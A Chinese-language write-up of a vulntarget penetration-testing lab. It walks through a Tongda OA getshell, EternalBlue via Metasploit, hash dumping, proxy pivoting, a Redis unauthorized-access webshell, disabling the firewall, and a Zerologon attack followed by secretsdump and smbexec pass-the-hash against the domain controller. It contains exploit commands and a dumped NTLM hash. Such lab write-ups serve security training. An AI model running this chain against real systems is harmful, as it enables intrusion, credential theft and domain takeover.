首先先说明一下这个靶场的环境qwq  
![](./img/1478563773705909136.png)

    
    
    win7
    密码：admin
    设置通达OA漏洞
    入站规则：80端口
    永恒之蓝
    动态外网IP（net模式），静态内网IP
    
    win2016
    账号：vulntarget\win2016
    密码：Admin#123
    管理员administrator密码（非域控密码）：Admin@123
    已安装redis，自启，web环境自启
    添加入站规则：80端口
    双静态内网IP
    
    win2019
    域控密码：Admin@666
    已安装：AD域、vmtools、添加域成员
    改计算机名为：win2019
    静态IP设置
    

用kali开始扫描出靶机ip，扫描一下同网段的ip就可以得到靶机ip

![](./img/6985621942338162865.png)  
发现192.168.135.152，应该就是靶机外网地址  
用kscan外网打点

![](./img/1005282200854531975.png)  
开放80端口，是通达OA，那么利用工具getshell即可  
获取cookie直接打就行

![](./img/5121737487146922258.png)  
蚁剑连接

![](./img/3134065449828370517.png)  
信息收集，发现有俩张网卡，还是system权限

![](./img/7185479656361133348.png)  
上fscan扫描一下，有一个永恒之蓝，也可以说是另一种方法拿到shell  
![](./img/6185215458137480223.png)  
那可以先让这台机器上线msf，建立路由，进行对20网段的渗透

    
    
    use exploit/windows/smb/ms17_010_eternalblue
    set rhost 192.168.135.152
    set lhost 192.168.135.128
    set lport 4444
    run
    

![](./img/7431345677997713055.png)  
拿到shell，改一下编码 chcp 65001 由于是system权限，可以直接利用hashdump看下当前用户的hash值  
得到密码，一般在内网信息收集，密码收集很重要，因为可以通过密码喷洒拿下其他主机

![](./img/1581787735314206444.png)

然后知道有一个20的网卡，建立路由与其通信

![](./img/7568269693905621220.png)  
成功添加路由，现在开启挂代理，然后就可以进行内网渗透了

    
    
    use auxiliary/server/socks_proxy
    set srvhost 127.0.0.1
    run
    

![](./img/9057929905296083825.png)

现在利用msf自身模块进行主机发现

    
    
    use post/windows/gather/arp_scanner
    set session 1
    set rhosts 10.0.20.1-254
    run
    

![](./img/6264184582568408037.png)

10.0.20.99这个ip就是我们的目标，然后这里要注意的是，proxychains只对tcp流量有效，udp和icmp都是不能代理转发的  
所以我们要正确运用nmap的功能，以免发现失败便误以为代理没配置成功（血的教训。。）

    
    
    proxychains nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080
    // -sT 全开扫描，完成三次握手，但这种方法现实中很容易被发现。。打靶场就随意
    // -Pn 不使用ping扫描
    

![](./img/5533717237442832535.png)

开放了80端口，看了一下没什么东西

![](./img/5526275354217204778.png)

fuzz下目录，看看有没有什么线索

    
    
    proxychains4 dirsearch -u "http://10.0.20.99" --proxy=socks5://127.0.0.1:8080 -t 5
    

![](./img/5388338935808246952.png)

这里有一个phpinfo，有一些相关信息，待会可以参考一下  
还有一个l.php，里面是一个php探针。现在回到之前那个端口扫描，发现开放了6379，这个是Redis服务，那么我们可以看是否存在未授权访问。  
对于redis未授权，网上的说法如下：  
主要是因为配置不当，导致未授权访问漏洞。进一步将恶意数据写入内存或者磁盘之中，造成更大的危害。  
配置不当一般主要是两个原理：  
1.配置登录策略导致任意机器都可以登录 redis。  
2.未设置密码或者设置弱口令。  
首先访问一下端口

    
    
    proxychains redis-cli -h 10.0.20.99
    

![](./img/1027616972090842818.png)

成功连接，那么可以写入一句话木马蚁剑连接拿下了  
![](./img/1031012699775328157.png)  
用蚁剑连接，需要挂代理,在这里有一个坑，网上的大佬说是要在kali用蚁剑连接才可以

    
    
    1、先将源码下载下来
    git clone https://github.com/AntSwordProject/antSword
    2、然后下载对应的蚁剑
    wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip
    3、解压
    unzip AntSword-Loader-v4.0.3-linux-x64.zip
    4、进入AntSword-Loader-v4.0.3-linux-x64目录下执行2步命令
    chmod 777 AntSword
    ./AntSword
    

![](./img/1420573957940231141.png)  
设置好代理连接就行

![](./img/62628375455325723.png)  
好了，拿到shell，在进行下一步渗透，先看一下网络情况和权限

![](./img/2335800147022325964.png)  
有一个10网段和一个管理员权限  
先让机器上线msf，方便渗透，这里要注意，内网机器一般都是不出网的，所以只能正向连接  
然后这里把目标机器的防火墙关一下，以免监听不到

    
    
    关闭防火墙
    netsh firewall set opmode mode=disable
    
    正向payload
    msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f exe >shell.exe
    

![](./img/6986599470057953551.png)  
信息收集一波  
同网段主机发现，发现一个10.0.10.110

![](./img/4611436072274293463.png)

![](./img/7418529703722683695.png)

![](./img/5795149958123154783.png)

![](./img/5383143956219463902.png)  
那么下面就是要打下域控了，由于是win2019，那我觉得一般都是要拿一下新的漏洞去打  
先解决通信问题，只有和域控通信了，才有机会  
先建立路由

![](./img/8216651232432545980.png)  
接着拿域控大杀器Zerologon漏洞打一下（CVE-2020-1472）

    
    
    关于这个漏洞（网上找的）
    攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，
    可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。
    
    影响版本
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2012
    Windows Server 2012 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2016
    Windows Server 2016 (Server Core installation)
    Windows Server 2019
    Windows Server 2019 (Server Core installation)
    Windows Server, version 1903 (Server Core installation)
    Windows Server, version 1909 (Server Core installation)
    Windows Server, version 2004 (Server Core installation)
    

在github上有，那么先准备好exp

    
    
    git clone https://github.com/SecureAuthCorp/impacket
    cd impacket
    python3 -m pip install -r requirements.txt
    python3 -m pip install .
    git clone https://github.com/dirkjanm/CVE-2020-1472.git
    cd CVE-2020-1472
    proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110
    

![](./img/7220826805950200308.png)  
等待进度条加载完成，密码就会被置空  
然后用刚刚下载的impacket进行横向移动（由于这工具包都在window，我又在kali下了一个）  
先获取管理员的hash，然后利用它examples目录下的exp获取hash

    
    
    proxychains python3 secretsdump.py vulntarget/win2019\$@10.0.10.110 -no-pass
    

![](./img/5084023496789020256.png)  
成功得到域管administrator的hash

    
    
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::
    

然后用这个工具包里面的工具进行横向移动就行了

    
    
    proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15
    administrator@10.0.10.110
    

![](./img/1392500049413878311.png)

